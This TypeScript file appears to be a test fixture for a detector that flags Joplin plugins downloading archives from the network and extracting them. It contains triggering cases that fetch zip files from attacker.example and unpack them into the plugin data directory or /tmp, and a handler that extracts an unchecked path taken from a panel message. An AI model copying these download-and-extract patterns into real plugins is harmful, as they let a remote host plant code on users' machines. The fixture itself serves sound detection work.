import { createHash } from 'node:crypto';
import { createWriteStream } from 'node:fs';
import { writeFile } from 'node:fs/promises';
import { Readable } from 'node:stream';
import { pipeline } from 'node:stream/promises';
import joplin from 'api';

async function saveArchive(path: string, content: Buffer) {
    await writeFile(path, content);
}

async function triggerRule(panel: string) {
    const response = await fetch('https://attacker.example/archive.zip');
    const archivePath = '/tmp/plugin-update.zip';
    const archiveContent = Buffer.from(await response.arrayBuffer());
    await saveArchive(archivePath, archiveContent);
    await joplin.fs.archiveExtract(archivePath, await joplin.plugins.dataDir());

    const hashedResponse = await fetch('https://attacker.example/hashed.zip');
    const hashedContent = Buffer.from(await hashedResponse.arrayBuffer());
    createHash('sha256').update(hashedContent).digest('hex');
    await writeFile('/tmp/hashed.zip', hashedContent);
    await joplin.fs.archiveExtract('/tmp/hashed.zip', '/tmp/hashed-output');

    const streamedResponse = await fetch('https://attacker.example/streamed.zip');
    const streamedPath = '/tmp/streamed.zip';
    if (!streamedResponse.body) throw new Error('Archive response has no body');
    Readable.fromWeb(streamedResponse.body as any).pipe(createWriteStream(streamedPath));
    await joplin.fs.archiveExtract(streamedPath, '/tmp/stream-output');

    const pipelineResponse = await fetch('https://attacker.example/pipeline.zip');
    const pipelinePath = '/tmp/pipeline.zip';
    if (!pipelineResponse.body) throw new Error('Archive response has no body');
    await pipeline(Readable.fromWeb(pipelineResponse.body as any), createWriteStream(pipelinePath));
    await joplin.fs.archiveExtract(pipelinePath, '/tmp/pipeline-output');

    const extraFs = joplin.require('fs-extra');
    const extraResponse = await fetch('https://attacker.example/fs-extra.zip');
    const extraPath = '/tmp/fs-extra.zip';
    await extraFs.outputFile(extraPath, Buffer.from(await extraResponse.arrayBuffer()));
    await joplin.fs.archiveExtract(extraPath, '/tmp/fs-extra-output');

    joplin.views.panels.onMessage(panel, async (message: any) => {
        await joplin.fs.archiveExtract(message.archivePath, '/tmp/message-extract');
    });
}

async function safeCases() {
    const dataDir = await joplin.plugins.dataDir();
    await joplin.fs.archiveExtract('/bundled-assets.zip', dataDir);

    const unusedResponse = await fetch('https://example.com/not-extracted.zip');
    console.info(unusedResponse.status);

    const lookalikeWriter = {
        writeFile: (_path: string, _content: Buffer) => undefined,
    };
    const response = await fetch('https://example.com/lookalike.zip');
    const path = '/tmp/lookalike.zip';
    lookalikeWriter.writeFile(path, Buffer.from(await response.arrayBuffer()));
    await joplin.fs.archiveExtract(path, '/tmp/lookalike-output');
}
